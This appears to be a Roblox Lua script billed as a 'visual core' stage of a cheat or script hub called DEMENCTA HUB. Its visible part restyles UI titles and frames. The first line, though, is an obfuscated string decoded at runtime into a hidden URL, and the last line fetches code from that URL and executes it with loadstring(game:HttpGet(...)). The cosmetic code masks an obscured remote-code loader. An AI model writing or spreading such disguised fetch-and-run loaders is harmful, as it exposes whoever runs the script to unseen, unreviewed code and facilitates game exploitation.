
--[[ STAGE 2: VISUAL CORE ]]
local wqDs8Kr9tu85R4wR="\121\121\125\125\132\063\088\092\147\166\160\107\184\174\173\181\182\199\190\192\214\199\220\220\223\217\238\235\229\179\252\252\254\196\007\012\015\022\022\034\030\038\039\032\053\244\059\047\058\072\068\068\082\081\085\028\094\102\098\107\048\136\109\126\131\129\142\156\163\142\143\158\157\152\184\106\192\200\174\186\190\190\189\220\233\202\219\236\215\150\167\159\175\157\008\016\000\250\251\016\022\036\208\033\211\220\223\222\229\056\247\057\054\070"local alaXDL7IAPw3d=56 local WUJa2y1Lm27603CCWLfs81=30 local uN_QCT2Be_8m=0 local Ooy6RnQAzNVhF=4 local UcOIqS640Rd0UgOVdC=7 local BnJReNEMVq5TSxO5FE8=false local eJ9jkNw6OW7vcbHriigop=bit32 and bit32.bxor if not eJ9jkNw6OW7vcbHriigop then eJ9jkNw6OW7vcbHriigop=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Hz9TXZvdHnWy0lXC5w={}for gVyaAib2jZni=1,#wqDs8Kr9tu85R4wR do local FHXgFAuHDXAu=string.byte(wqDs8Kr9tu85R4wR,gVyaAib2jZni)local v9AKdEBFZjTb75UK3Nvx=(WUJa2y1Lm27603CCWLfs81+(gVyaAib2jZni*Ooy6RnQAzNVhF)+UcOIqS640Rd0UgOVdC)%256 if uN_QCT2Be_8m==0 then FHXgFAuHDXAu=(FHXgFAuHDXAu-v9AKdEBFZjTb75UK3Nvx)%256 Hz9TXZvdHnWy0lXC5w[gVyaAib2jZni]=string.char(eJ9jkNw6OW7vcbHriigop(FHXgFAuHDXAu,alaXDL7IAPw3d))else FHXgFAuHDXAu=eJ9jkNw6OW7vcbHriigop(FHXgFAuHDXAu,alaXDL7IAPw3d)Hz9TXZvdHnWy0lXC5w[gVyaAib2jZni]=string.char((FHXgFAuHDXAu-v9AKdEBFZjTb75UK3Nvx)%256)end end local qqelf8xLUKynj=table.concat(Hz9TXZvdHnWy0lXC5w)if BnJReNEMVq5TSxO5FE8 then qqelf8xLUKynj=string.reverse(qqelf8xLUKynj)end local xgZuMiWgUpcPhTVV1vizGy=qqelf8xLUKynj
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(xgZuMiWgUpcPhTVV1vizGy))()
